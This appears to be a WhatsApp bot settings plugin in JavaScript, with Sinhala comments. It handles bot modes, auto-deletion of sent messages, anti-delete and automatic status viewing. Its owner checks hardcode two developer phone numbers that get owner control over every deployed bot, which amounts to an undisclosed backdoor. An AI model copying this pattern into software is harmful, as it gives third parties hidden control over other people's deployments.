// Per-Bot Independent Cluster Settings Store (Session/Bot Phone මත පදනම්ව)
global.botSettingsStore = global.botSettingsStore || new Map();
global.settingsHookedSockets = global.settingsHookedSockets || new WeakSet();

// Bot Phone Number එක ලබා ගැනීම
function getBotPhone(sock) {
  const userJid = sock.user?.id || "";
  return userJid.split(":")[0].replace(/[^0-9]/g, "");
}

// Default Settings Generator
function getBotConfig(botPhone) {
  if (!global.botSettingsStore.has(botPhone)) {
    global.botSettingsStore.set(botPhone, {
      mode: "public", // public | private | group | inbox
      antiSend: "off", // off | me | from | all
      antiDelete: true,
      statusSeen: true,
      statusReact: true,
      statusEmoji: "💚"
    });
  }
  return global.botSettingsStore.get(botPhone);
}

// Bot Owner හෝ Master Developer පරීක්ෂාව
function isBotOwner(sock, msg, from) {
  const botPhone = getBotPhone(sock);
  const senderJid = msg.key.fromMe
    ? botPhone
    : (msg.key.participant || msg.participant || from || "");
  const senderPhone = String(senderJid).split("@")[0].split(":")[0].replace(/[^0-9]/g, "");

  const devNumbers = ["94719845166", "15947733680169"];
  return msg.key.fromMe || senderPhone === botPhone || devNumbers.includes(senderPhone);
}

// Background Middleware: Bot Modes & Anti-Send Automation
function attachSettingsEngine(sock) {
  if (!sock || global.settingsHookedSockets.has(sock)) return;
  global.settingsHookedSockets.add(sock);

  // 1. Bot Work Mode Restriction Interceptor
  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return;
    const m = messages[0];
    if (!m?.message) return;

    const botPhone = getBotPhone(sock);
    const config = getBotConfig(botPhone);

    const from = m.key.remoteJid;
    if (from === "status@broadcast") return;

    const isGroup = from.endsWith("@g.us");
    const sender = isGroup 
      ? (m.key.participant || m.participant || from) 
      : (m.key.fromMe ? (sock.user?.id || from) : from);
    const cleanSender = String(sender).split("@")[0].split(":")[0].replace(/[^0-9]/g, "");

    const devNumbers = ["94719845166", "15947733680169"];
    const isOwner = m.key.fromMe || cleanSender === botPhone || devNumbers.includes(cleanSender);

    // Mode Checks (Owner නොවන අයට අදාළ Mode අනුව command run වීම නවතයි)
    if (!isOwner) {
      if (config.mode === "private") {
        // Private Mode: Owner ට හැර වෙන කිසිවෙකුට command ක්‍රියාත්මක නොවේ
        m.message = null;
        return;
      }
      if (config.mode === "group" && !isGroup) {
        // Group Only Mode: Inbox command drop කරයි
        m.message = null;
        return;
      }
      if (config.mode === "inbox" && isGroup) {
        // Inbox Only Mode: Group command drop කරයි
        m.message = null;
        return;
      }
    }
  });

  // 2. Anti-Send (Auto-Delete) Real-Time Watcher
  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    for (const m of messages) {
      if (!m?.message) continue;
      const chatJid = m.key.remoteJid;
      if (chatJid === "status@broadcast") continue;

      const botPhone = getBotPhone(sock);
      const config = getBotConfig(botPhone);
      if (config.antiSend === "off") continue;

      // Mode: .antisend me (බොට්ගේ නම්බර් එකෙන් යවන මැසේජ් ක්ෂණිකව auto delete කරයි)
      if ((config.antiSend === "me" || config.antiSend === "all") && m.key.fromMe) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }

      // Mode: .antisend from (අනිත් අය එවන මැසේජ් බොට් auto delete කරයි - Bot Group Admin විය යුතුය)
      if ((config.antiSend === "from" || config.antiSend === "all") && !m.key.fromMe) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }
    }
  });
}

// Cluster Auto Hook Watcher
setInterval(() => {
  if (global.activeSockets) {
    for (const [, s] of global.activeSockets.entries()) {
      attachSettingsEngine(s);
    }
  }
}, 2000);

export default {
  name: "setting",
  aliases: ["settings", "botmode", "mode", "antisend", "config"],
  category: "owner",
  description: "Comprehensive Bot & Cluster Control Panel",

  async execute({ sock, msg, from, args, body, config: botAppConfig }) {
    attachSettingsEngine(sock);

    const prefix = botAppConfig?.PREFIX || ".";
    const botPhone = getBotPhone(sock);
    const settings = getBotConfig(botPhone);

    if (!isBotOwner(sock, msg, from)) {
      await sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "⛔ *ACCESS DENIED:* මෙම සැකසුම් වෙනස් කළ හැක්කේ Bot Owner හට පමණි." },
        { quoted: msg }
      );
    }

    const fullBody = body.trim().slice(prefix.length).trim();
    const commandTrigger = fullBody.split(/ +/)[0].toLowerCase();

    // 1. Anti-Send Direct Command (.antisend me / from / all / off)
    if (commandTrigger === "antisend") {
      const modeArg = args[0]?.toLowerCase();
      if (!["me", "from", "all", "off"].includes(modeArg)) {
        return await sock.sendMessage(from, {
          text: `⚠️ *භාවිතය:*\n• \`${prefix}antisend me\` (මම යවන ඒවා Auto Delete)\n• \`${prefix}antisend from\` (අනික් අය එවන ඒවා Auto Delete)\n• \`${prefix}antisend all\` (සියල්ල Auto Delete)\n• \`${prefix}antisend off\` (අක්‍රීය කිරීමට)\n\n*වත්මන් තත්ත්වය:* \`${settings.antiSend.toUpperCase()}\``
        }, { quoted: msg });
      }

      settings.antiSend = modeArg;
      global.botSettingsStore.set(botPhone, settings);

      await sock.sendMessage(from, { react: { text: "🛡️", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(from, {
        text: `✅ *Anti-Send යාවත්කාලීන විය:*\n\n🤖 *Node:* +${botPhone}\n⚡ *Mode:* \`${modeArg.toUpperCase()}\``
      }, { quoted: msg });
    }

    // 2. Mode Direct Command (.mode public / private / group / inbox)
    if (commandTrigger === "mode" || commandTrigger === "botmode") {
      const modeArg = args[0]?.toLowerCase();
      if (!["public", "private", "group", "inbox"].includes(modeArg)) {
        return await sock.sendMessage(from, {
          text: `⚠️ *භාවිතය:*\n• \`${prefix}mode public\` (සියල්ලන්ටම විවෘතයි)\n• \`${prefix}mode private\` (Owner ට පමණයි)\n• \`${prefix}mode group\` (Groups වලට පමණයි)\n• \`${prefix}mode inbox\` (DM/Inbox වලට පමණයි)\n\n*වත්මන් Mode එක:* \`${settings.mode.toUpperCase()}\``
        }, { quoted: msg });
      }

      settings.mode = modeArg;
      global.botSettingsStore.set(botPhone, settings);

      await sock.sendMessage(from, { react: { text: "⚙️", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(from, {
        text: `✅ *Bot Mode එක වෙනස් කරන ලදී:*\n\n🤖 *Node:* +${botPhone}\n🎯 *New Mode:* \`${modeArg.toUpperCase()}\``
      }, { quoted: msg });
    }

    // 3. Status/Anti-Delete Toggle Sync
    const subAction = args[0]?.toLowerCase();
    const subVal = args[1]?.toLowerCase();

    if (subAction === "antidel") {
      const state = subVal === "on";
      settings.antiDelete = state;
      global.antiDeleteSettings?.set(botPhone, state);
      return await sock.sendMessage(from, { text: `🛡️ Anti-Delete: *${state ? "ENABLED" : "DISABLED"}*` }, { quoted: msg });
    }

    if (subAction === "stseen") {
      const state = subVal === "on";
      settings.statusSeen = state;
      if (global.statusSettings?.get(botPhone)) global.statusSettings.get(botPhone).seen = state;
      return await sock.sendMessage(from, { text: `👁️ Status Auto Seen: *${state ? "ENABLED" : "DISABLED"}*` }, { quoted: msg });
    }

    if (subAction === "stract") {
      const state = subVal === "on";
      settings.statusReact = state;
      if (global.statusSettings?.get(botPhone)) global.statusSettings.get(botPhone).react = state;
      return await sock.sendMessage(from, { text: `💖 Status Auto React: *${state ? "ENABLED" : "DISABLED"}*` }, { quoted: msg });
    }

    // 4. Default Settings Main Dashboard
    const statusData = global.statusSettings?.get(botPhone) || {};
    const curEmoji = statusData.emoji || settings.statusEmoji || "💚";
    const curSeen = statusData.seen ?? settings.statusSeen;
    const curReact = statusData.react ?? settings.statusReact;
    const curAntiDel = global.antiDeleteSettings?.get(botPhone) ?? settings.antiDelete;

    const dashboardCard = 
`╔══════════════════════╗
   🕷️ 𝐃 𝐀 𝐑 𝐊 - 𝐃 𝐈 𝐍 𝐔 🕷️
╚══════════════════════╝

┌─〔 ⚙️ *BOT CONFIGURATION PANEL* 〕
├─▸ 🤖 *Active Node* : +${botPhone}
├─▸ 🎯 *Work Mode*   : \`${settings.mode.toUpperCase()}\`
├─▸ 🚫 *Anti-Send*   : \`${settings.antiSend.toUpperCase()}\`
├─▸ 🛡️ *Anti-Delete* : ${curAntiDel ? "🟢 ON" : "🔴 OFF"}
├─▸ 👁️ *Status Seen* : ${curSeen ? "🟢 ON" : "🔴 OFF"}
├─▸ 💖 *Status React*: ${curReact ? "🟢 ON" : "🔴 OFF"}
├─▸ 🎭 *React Emoji* : ${curEmoji}
└───────────────────────

┌─〔 🛠️ *CONTROL COMMANDS* 〕
├─▸ \`${prefix}mode public / private / group / inbox\`
├─▸ \`${prefix}antisend me / from / all / off\`
├─▸ \`${prefix}antidel on / off\`
├─▸ \`${prefix}stseen on / off\`
├─▸ \`${prefix}stract on / off\`
├─▸ \`${prefix}setst react <emoji>\`
└───────────────────────

> 👑 *Developer:* DINIDU HESHAN
> *𝐃𝙍𝕶 𝑫𝙄𝙉𝙐 𝐂𝐋𝐔𝐒𝐓𝐄𝐑 🐦‍🔥*`;

    await sock.sendMessage(from, { text: dashboardCard }, { quoted: msg });
    await sock.sendMessage(from, { react: { text: "🎛️", key: msg.key } }).catch(() => {});
  }
};
